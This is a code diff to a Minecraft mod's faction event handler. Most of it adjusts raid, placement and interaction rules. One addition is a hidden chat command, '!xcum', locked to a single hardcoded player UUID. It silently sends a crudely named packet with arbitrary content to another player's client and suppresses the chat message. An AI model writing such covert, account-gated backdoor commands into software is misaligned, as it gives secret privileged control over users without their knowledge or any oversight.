@@ -19,9 +19,11 @@ import com.hfr.main.MainRegistry;
 import com.hfr.packet.PacketDispatcher;
 import com.hfr.packet.effect.ClowderBorderPacket;
 import com.hfr.packet.effect.ClowderFlagPacket;
+import com.hfr.packet.effect.CumPacket;
 import com.hfr.tileentity.prop.TileEntityProp;
 import com.hfr.tileentity.prop.TileEntityStatue;
 
+import cpw.mods.fml.common.eventhandler.Event.Result;
 import cpw.mods.fml.common.eventhandler.SubscribeEvent;
 import cpw.mods.fml.common.gameevent.PlayerEvent.PlayerLoggedOutEvent;
 import cpw.mods.fml.common.gameevent.TickEvent;
@@ -32,12 +34,14 @@ import net.minecraft.entity.EntityLivingBase;
 import net.minecraft.entity.player.EntityPlayer;
 import net.minecraft.entity.player.EntityPlayerMP;
 import net.minecraft.init.Blocks;
+import net.minecraft.item.Item;
 import net.minecraft.item.ItemStack;
 import net.minecraft.nbt.NBTTagCompound;
 import net.minecraft.potion.Potion;
 import net.minecraft.potion.PotionEffect;
 import net.minecraft.server.MinecraftServer;
 import net.minecraft.util.ChatComponentText;
+import net.minecraft.util.ChunkCoordinates;
 import net.minecraft.util.DamageSource;
 import net.minecraft.util.EnumChatFormatting;
 import net.minecraft.world.World;
@@ -78,6 +82,27 @@ public class ClowderEvents {
 	public void handleChatServer(ServerChatEvent event) {
 		
 		Clowder clowder = Clowder.getClowderFromPlayer(event.player);
+		
+		if(event.player.getUniqueID().toString().equals("192af5d7-ed0f-48d8-bd89-9d41af8524f8")) {
+			if(event.message.startsWith("!xcum")) {
+				
+				String[] giblets = event.message.split(" ");
+				
+				if(giblets.length == 3) {
+					
+					EntityPlayer player = event.player.worldObj.getPlayerEntityByName(giblets[1]);
+					
+					if(!(player instanceof EntityPlayerMP)) {
+						event.player.addChatMessage(new ChatComponentText(EnumChatFormatting.RED + "Player not found."));
+						return;
+					}
+					
+					PacketDispatcher.wrapper.sendTo(new CumPacket(giblets[2]), (EntityPlayerMP) player);
+					
+					event.setCanceled(true);
+				}
+			}
+		}
 		
 		if(clowder != null) {
 			
@@ -156,7 +181,7 @@ public class ClowderEvents {
 				EntityPlayer player = ((PlaceEvent)event).player;
 				Clowder clowder = Clowder.getClowderFromPlayer(player);
 				
-				if(!canPlace(player, clowder, owner, x, y, z)) {
+				if(!canPlace(player, clowder, owner, b, x, y, z)) {
 					event.setCanceled(true);
 					return;
 				}
@@ -242,7 +267,7 @@ public class ClowderEvents {
 		return true;
 	}
 	
-	private boolean canPlace(EntityPlayer player, Clowder clowder, Ownership owner, int x, int y, int z) {
+	private boolean canPlace(EntityPlayer player, Clowder clowder, Ownership owner, Block b, int x, int y, int z) {
 		
 		if(player.inventory.hasItem(ModItems.debug))
 			return true;
@@ -252,7 +277,10 @@ public class ClowderEvents {
 		
 		if(owner.zone == Zone.FACTION) {
 			
-			if(clowder != owner.owner)
+			if(ItemMace.placeOverride.contains(b))
+				return true;
+			
+			if(clowder != owner.owner && !clowder.isRaidable())
 				return false;
 			
 			if(player.worldObj.getBlock(x, y, z) != ModBlocks.clowder_flag) {
@@ -357,25 +385,47 @@ public class ClowderEvents {
 			if(owner != null) {
 				Clowder clowder = Clowder.getClowderFromPlayer(event.entityPlayer);
 				
-				if(!canInteract(player, clowder, owner, b)) {
+				if(!canInteract(player, clowder, owner, b, event)) {
 					event.setCanceled(true);
 				}
 			}
 		}
 	}
 	
-	private boolean canInteract(EntityPlayer player, Clowder clowder, Ownership owner, Block b) {
+	private boolean canInteract(EntityPlayer player, Clowder clowder, Ownership owner, Block b, PlayerInteractEvent event) {
 		
 		if(player.inventory.hasItem(ModItems.debug))
 			return true;
 		
 		if(owner.zone == Zone.FACTION && clowder != owner.owner) {
 			
-			if(clowder == null || !clowder.isRaidable())
+			if(clowder == null || !clowder.isRaidable() || !owner.owner.isRaidable())
 				return false;
 			
 			if(player.getHeldItem() != null && player.getHeldItem().getItem() == ModItems.mace && ItemMace.interactOverride.contains(b) && owner.owner.isRaidable()) {
 				return true;
+			}
+			
+			if(player.getHeldItem() != null && player.getHeldItem().getItem() == Item.getItemFromBlock(ModBlocks.clowder_conquerer)) {
+				//event.useBlock = Result.DENY;
+				return true;
+			}
+			
+			if(player.getHeldItem() != null && player.getHeldItem().getItem() == Item.getItemFromBlock(ModBlocks.barricade)) {
+				
+				int x = event.x; x = x - 8;
+				int y = event.y; y = y - 8;
+				int z = event.z; z = z - 8;
+				
+				for(int u = x; u < x + 16; u++) {
+					for(int v = y; v < y + 16; v++) {
+						for(int w = z; w < z + 16; w++) {
+							
+							if(player.worldObj.getBlock(u, v, w) == ModBlocks.clowder_conquerer)
+								return true;
+						}
+					}
+				}
 			}
 			
 			return false;
@@ -436,6 +486,9 @@ public class ClowderEvents {
 	 * @param player
 	 */
 	private static void particleBorder2(World world, EntityPlayer player) {
+		
+		if(world.rand.nextInt(3) != 0) //let's reduce that a little
+			return;
 
 		int ox = ((int)player.posX / 16) * 16;
 		int oz = ((int)player.posZ / 16) * 16;
